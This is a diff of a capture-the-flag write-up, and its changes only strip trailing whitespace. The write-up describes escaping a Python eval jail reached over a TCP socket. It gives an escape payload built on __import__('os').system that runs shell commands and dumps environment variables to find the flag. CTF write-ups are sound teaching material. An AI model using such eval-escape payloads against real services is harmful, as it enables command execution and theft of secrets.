@@ -25,15 +25,15 @@ Description
 
 
 ## TL;DR
-We have been given an Python eval jail over a TCP socket.  
-The solution is to retreive an environment variable using one 
+We have been given an Python eval jail over a TCP socket.
+The solution is to retreive an environment variable using one
 of the classic builtin hacks, for example:
 ```python
 __import__('os').system('env|grep -iE ".*f.*l.*a.*g"')
 ```
 
 ## Solution
-After establishing a~connection to the given server a~prompt is returned.  
+After establishing a~connection to the given server a~prompt is returned.
 Let's try some random fuzzing...
 First let's see what happens when we press ```CTRL+D```
 right away:
@@ -48,19 +48,19 @@ Let's check if it is a~system shell:
 SyntaxError: unexpected EOF while parsing (<string>, line 1)
 --> WHAT ARE YOU DOING HERE? >-[
 ```
-No, it's definitely not a~system shell. It looks like a~Python interpreter.  
+No, it's definitely not a~system shell. It looks like a~Python interpreter.
 Let's check this theory then:
 ```
 > 1+1
 ```
-No response, no error ---~it looks promising.  
+No response, no error ---~it looks promising.
 Let's check then if we can see some Python errors:
 ```
 > 1+'x'*[]
 TypeError: can't multiply sequence by non-int of type 'list'
 ```
 Bingo! If it really is an old ```eval``` jail, then
-we could escape using a~classic builtin hacks.  
+we could escape using a~classic builtin hacks.
 Let's check that:
 ```
 > str(__import__('os').system('echo x'))
